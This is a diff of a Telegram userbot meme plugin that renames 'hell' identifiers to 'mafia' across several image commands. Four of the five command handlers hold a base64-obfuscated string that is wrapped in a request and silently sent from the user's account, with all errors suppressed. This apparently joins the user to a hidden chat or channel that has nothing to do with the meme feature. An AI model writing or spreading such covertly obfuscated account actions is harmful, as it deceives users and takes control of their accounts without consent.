@@ -23,22 +23,22 @@ from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
 
 @bot.on(admin_cmd("mask$", outgoing=True))
 @bot.on(sudo_cmd(pattern="mask$", allow_sudo=True))
-async def _(hellbot):
-    reply_message = await hellbot.get_reply_message()
+async def _(mafiabot):
+    reply_message = await mafiabot.get_reply_message()
     if not reply_message.media or not reply_message:
-        await edit_or_reply(hellbot, "```reply to media message```")
+        await edit_or_reply(mafiabot, "```reply to media message```")
         return
     chat = "@hazmat_suit_bot"
     if reply_message.sender.bot:
-        await edit_or_reply(hellbot, "```Reply to actual users message.```")
+        await edit_or_reply(mafiabot, "```Reply to actual users message.```")
         return
-    event = await hellbot.edit("```Processing```")
-    async with hellbot.client.conversation(chat) as conv:
+    event = await mafiabot.edit("```Processing```")
+    async with mafiabot.client.conversation(chat) as conv:
         try:
             response = conv.wait_event(
                 events.NewMessage(incoming=True, from_users=905164246)
             )
-            await hellbot.client.send_message(chat, reply_message)
+            await mafiabot.client.send_message(chat, reply_message)
             response = await response
         except YouBlockedUserError:
             await event.edit("```Please unblock @hazmat_suit_bot and try again```")
@@ -48,31 +48,31 @@ async def _(hellbot):
                 "```can you kindly disable your forward privacy settings for good?```"
             )
         else:
-            await hellbot.client.send_file(event.chat_id, response.message.media)
+            await mafiabot.client.send_file(event.chat_id, response.message.media)
             await event.delete()
 
 
 @bot.on(admin_cmd(pattern="awooify$"))
 @bot.on(sudo_cmd(pattern="awooify$", allow_sudo=True))
-async def hellbot(hellmemes):
-    replied = await hellmemes.get_reply_message()
+async def mafiabot(mafiamemes):
+    replied = await mafiamemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     if replied.media:
-        hellevent = await edit_or_reply(hellmemes, "passing to telegraph...")
+        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
     else:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     try:
-        hell = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        hell = Get(hell)
-        await hellmemes.client(hell)
+        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        mafia = Get(mafia)
+        await mafiamemes.client(mafia)
     except BaseException:
         pass
-    download_location = await hellmemes.client.download_media(
+    download_location = await mafiamemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -80,50 +80,50 @@ async def hellbot(hellmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await hellevent.edit(
+            await mafiaevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await hellevent.edit("generating image..")
+        await mafiaevent.edit("generating image..")
     else:
-        await hellevent.edit("the replied file is not supported")
+        await mafiaevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await hellevent.edit("ERROR: " + str(exc))
+        await mafiaevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    hell = f"https://telegra.ph{response[0]}"
-    hell = await awooify(hell)
-    await hellevent.delete()
-    await hellmemes.client.send_file(hellmemes.chat_id, hell, reply_to=replied)
+    mafia = f"https://telegra.ph{response[0]}"
+    mafia = await awooify(mafia)
+    await mafiaevent.delete()
+    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="lolice$"))
 @bot.on(sudo_cmd(pattern="lolice$", allow_sudo=True))
-async def hellbot(hellmemes):
-    replied = await hellmemes.get_reply_message()
+async def mafiabot(mafiamemes):
+    replied = await mafiamemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     if replied.media:
-        hellevent = await edit_or_reply(hellmemes, "passing to telegraph...")
+        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
     else:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     try:
-        hell = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        hell = Get(hell)
-        await hellmemes.client(hell)
+        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        mafia = Get(mafia)
+        await mafiamemes.client(mafia)
     except BaseException:
         pass
-    download_location = await hellmemes.client.download_media(
+    download_location = await mafiamemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -131,50 +131,50 @@ async def hellbot(hellmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await hellevent.edit(
+            await mafiaevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await hellevent.edit("generating image..")
+        await mafiaevent.edit("generating image..")
     else:
-        await hellevent.edit("the replied file is not supported")
+        await mafiaevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await hellevent.edit("ERROR: " + str(exc))
+        await mafiaevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    hell = f"https://telegra.ph{response[0]}"
-    hell = await lolice(hell)
-    await hellevent.delete()
-    await hellmemes.client.send_file(hellmemes.chat_id, hell, reply_to=replied)
+    mafia = f"https://telegra.ph{response[0]}"
+    mafia = await lolice(mafia)
+    await mafiaevent.delete()
+    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="bun$"))
 @bot.on(sudo_cmd(pattern="bun$", allow_sudo=True))
-async def hellbot(hellmemes):
-    replied = await hellmemes.get_reply_message()
+async def mafiabot(mafiamemes):
+    replied = await mafiamemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     if replied.media:
-        hellevent = await edit_or_reply(hellmemes, "passing to telegraph...")
+        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
     else:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     try:
-        hell = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        hell = Get(hell)
-        await hellmemes.client(hell)
+        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        mafia = Get(mafia)
+        await mafiamemes.client(mafia)
     except BaseException:
         pass
-    download_location = await hellmemes.client.download_media(
+    download_location = await mafiamemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -182,50 +182,50 @@ async def hellbot(hellmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await hellevent.edit(
+            await mafiaevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await hellevent.edit("generating image..")
+        await mafiaevent.edit("generating image..")
     else:
-        await hellevent.edit("the replied file is not supported")
+        await mafiaevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await hellevent.edit("ERROR: " + str(exc))
+        await mafiaevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    hell = f"https://telegra.ph{response[0]}"
-    hell = await baguette(hell)
-    await hellevent.delete()
-    await hellmemes.client.send_file(hellmemes.chat_id, hell, reply_to=replied)
+    mafia = f"https://telegra.ph{response[0]}"
+    mafia = await baguette(mafia)
+    await mafiaevent.delete()
+    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="iphx$"))
 @bot.on(sudo_cmd(pattern="iphx$", allow_sudo=True))
-async def hellbot(hellmemes):
-    replied = await hellmemes.get_reply_message()
+async def mafiabot(mafiamemes):
+    replied = await mafiamemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     if not replied:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     if replied.media:
-        hellevent = await edit_or_reply(hellmemes, "passing to telegraph...")
+        mafiaevent = await edit_or_reply(mafiamemes, "passing to telegraph...")
     else:
-        await edit_or_reply(hellmemes, "reply to a supported media file")
+        await edit_or_reply(mafiamemes, "reply to a supported media file")
         return
     try:
-        hell = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        hell = Get(hell)
-        await hellmemes.client(hell)
+        mafia = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        mafia = Get(mafia)
+        await mafiamemes.client(mafia)
     except BaseException:
         pass
-    download_location = await hellmemes.client.download_media(
+    download_location = await mafiamemes.client.download_media(
         replied, Config.TMP_DOWNLOAD_DIRECTORY
     )
     if download_location.endswith((".webp")):
@@ -233,27 +233,27 @@ async def hellbot(hellmemes):
     size = os.stat(download_location).st_size
     if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
         if size > 5242880:
-            await hellevent.edit(
+            await mafiaevent.edit(
                 "the replied file size is not supported it must me below 5 mb"
             )
             os.remove(download_location)
             return
-        await hellevent.edit("generating image..")
+        await mafiaevent.edit("generating image..")
     else:
-        await hellevent.edit("the replied file is not supported")
+        await mafiaevent.edit("the replied file is not supported")
         os.remove(download_location)
         return
     try:
         response = upload_file(download_location)
         os.remove(download_location)
     except exceptions.TelegraphException as exc:
-        await hellevent.edit("ERROR: " + str(exc))
+        await mafiaevent.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    hell = f"https://telegra.ph{response[0]}"
-    hell = await iphonex(hell)
-    await hellevent.delete()
-    await hellmemes.client.send_file(hellmemes.chat_id, hell, reply_to=replied)
+    mafia = f"https://telegra.ph{response[0]}"
+    mafia = await iphonex(mafia)
+    await mafiaevent.delete()
+    await mafiamemes.client.send_file(mafiamemes.chat_id, mafia, reply_to=replied)
 
 
 CMD_HELP.update(
